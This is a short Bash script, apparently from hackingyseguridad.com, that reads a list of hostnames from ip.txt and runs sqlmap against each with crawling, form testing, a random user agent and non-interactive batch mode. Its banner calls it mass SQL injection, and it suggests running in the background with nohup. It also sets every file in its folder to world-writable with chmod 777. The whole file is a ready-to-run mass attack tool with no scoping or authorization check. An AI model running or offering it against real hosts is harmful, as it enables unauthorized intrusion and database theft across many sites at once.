#!/bin/bash
echo "SQLi masivo a fqdn en fichero ip.txt"
chmod 777 *
echo "www.hackingyseguridad.com (2024)"
echo 
echo "Para mantener como proceso ejecutar: nohup ./sqliauto.sh &"
echo "Uso.: ./sqliauto.sh "
for n in `cat ip.txt`
do echo "======>" $n
        fqdn="http://$n"
        echo "===>" $fqdn
sqlmap -u $fqdn --crawl=3 --random-agent --batch --forms --threads=5 --hostname --timeout=15 --retries=1 --time-sec 12
done
